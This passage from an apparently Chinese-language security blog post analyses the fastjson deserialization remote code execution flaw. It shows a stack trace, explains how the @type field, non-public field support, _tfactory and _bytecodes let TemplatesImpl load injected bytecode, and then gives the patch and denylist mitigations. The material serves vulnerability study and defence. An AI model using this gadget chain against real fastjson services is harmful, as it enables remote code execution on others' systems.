com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
java.lang.reflect.Method.invoke(Method.java:497)
com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:85)
com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:83)
com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:773)
com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:600)
com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:188)
com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184)
com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)
com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)
com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze(JavaObjectDeserializer.java:45)
com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639)
com.alibaba.fastjson.JSON.parseObject(JSON.java:339)
com.alibaba.fastjson.JSON.parseObject(JSON.java:302)
com.whh.netty.Main.main(Main.java:39)
```
该漏洞原理是，在fastjson在反序列化时，可以通过`@type`指定解析类，fastjson会根据指定类去反序列化得到该类的实例，默认只会反序列化public的属性，所以通过`Feature.SupportNonPublicField`开启私有属性序列化，属性`_tfactory`无get、set方法，设置`_tfactory:{ }`，fastjson会调用其中无参构造函数得到`_tfactory`，这就避免了部分版本中`defineTransletClasses`使用了`_tfactory`导致异常。

序列化流程分析：
1、fastjson反序列化json，对序列化对象进行赋值。`com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue`
2、调用`TemplatesImpl.getOutputProperties`
3、创建Transformer
4、`TemplatesImpl.getTransletInstance`，在该处有创建`_class`，通过获取`_bytecodes`中的字节加载类。
5、创建加载类的对象，这时就会执行创建对象时我们设置的危险代码。

这里之前好奇为什么在反序列化的时候，会调用`TemplatesImpl.getOutputProperties`，在对代码进行debug时发现，`com.alibaba.fastjson.util.JavaBeanInfo 505行`会判断该类中的所有方法，判断get方法，同时判断返回值是否指定的类型，如果如果是指定的类型，会保存该方法，在保存前会检查该属性是否已经保存过（set方法，如果有set方法那么在之前就已经保存），如果已经保存过该方法，那么就会`continue`，那么也就不会保存该get方法。在后续设置值是，就会通过上述保存的方法设置值（set > get）。这样也就可以解释为什么会调用`TemplatesImpl.getOutputProperties`，因为`_outputProperties`没有set方法只有get。

##### fastjson漏洞解决办法
更新版本1.2.28/1.2.29/1.2.30/1.2.31或者更新版本。[安全升级公告](https://github.com/alibaba/fastjson/wiki/security_update_20170315)

fastjson更新能够解决。

fastjson解决方式：
autoTypeSupport默认关闭，需要手动打开，`com.alibaba.fastjson.parser.ParserConfig#autoTypeSupport`
设置黑名单，禁止部分包通过`autoType`进行反序列化。`com.alibaba.fastjson.parser.ParserConfig#denyList`
具体fastjson更新代码地址：https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5


* 参考资料：
[Lib之过？Java反序列化漏洞通用利用分析](https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/)
[Java 序列化的高级认识](https://www.ibm.com/developerworks/cn/java/j-lo-serial/)
[fastjson 远程反序列化poc的构造和分析](http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/)
